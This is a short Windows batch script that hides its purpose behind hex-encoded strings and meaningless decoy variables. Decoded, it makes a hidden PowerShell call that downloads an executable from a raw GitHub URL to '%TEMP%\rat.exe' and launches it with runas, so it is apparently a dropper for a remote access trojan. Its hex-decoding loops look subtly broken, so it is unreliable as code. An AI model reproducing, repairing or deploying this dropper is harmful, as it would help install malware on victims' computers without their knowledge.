@echo off
setlocal enabledelayedexpansion

set "H1=50 6F 77 65 72 73 68 65 6C 6C 20 2D 57 69 6E 64 6F 77 53 74 79 6C 65 20 48 69 64 64 65 6E"
set "H2=69 6E 76 6F 6B 65 2D 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 73 3A 2F 2F 72 61 77 2E 67 69 74 68 75 62 2E 63 6F 6D 2F 63 6C 61 79 6B 72 73 2F 63 6C 61 79 6B 72 73 2F 6D 61 69 6E 2F 64 65 66 61 75 6C 74 2E 65 78 65"
set "H3=25 54 45 4D 50 5C 72 61 74 2E 65 78 65"
set "H4=72 75 6E 61 73"
set "H5=2D 57 69 6E 64 6F 77 53 74 79 6C 65 20 48 69 64 64 65 6E"
set "H6=50 6F 77 65 72 73 68 65 6C 6C 20 2D 57 69 6E 64 6F 77 53 74 79 6C 65"
set "H7=57 69 6E 64 6F 77 53 74 79 6C 65"

set "X=6C 61 74 65 6E 74 20 72 65 72 74 61 20 74 6F 20 63 72 65 61 74 65"
set "Y=61 72 79 20 73 74 61 72 74 75 72 65 20 63 68 65 63 6B 20 69 6E 20 74 6F 20 62 65 63 6F 6D 65 2E"
set "Z=66 6F 72 20 72 65 61 6C 73 2E"

for %%A in (%X%) do set "Z1=!Z1!!%%A!"
for %%A in (%Y%) do set "Z2=!Z2!!%%A!"
for %%A in (%Z%) do set "Z3=!Z3!!%%A!"

:: Decode hexadecimal strings to ASCII
set "V1="
for %%A in (%H1%) do set "V1=!V1!!%%A!"
set "V2="
for %%A in (%H2%) do set "V2=!V2!!%%A!"
set "V3="
for %%A in (%H3%) do set "V3=!V3!!%%A!"
set "V4="
for %%A in (%H4%) do set "V4=!V4!!%%A!"
set "V5="
for %%A in (%H5%) do set "V5=!V5!!%%A!"
set "V6="
for %%A in (%H6%) do set "V6=!V6!!%%A!"
set "V7="
for %%A in (%H7%) do set "V7=!V7!!%%A!"

set "A=!V2!"
set "B=!V3!"
set "C=!V4!"
set "D=!V5!"
set "E=!V6!"
set "F=!V7!"

set "G=!A!!B!!C!!D!!E!!F!"
set "H=!G!!A!"
set "I=!H!!B!!C!!D!"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest '!V2!' -OutFile '!V3!'" >nul 2>&1
start /B "" runas /user:!V4! "!V3!"

endlocal
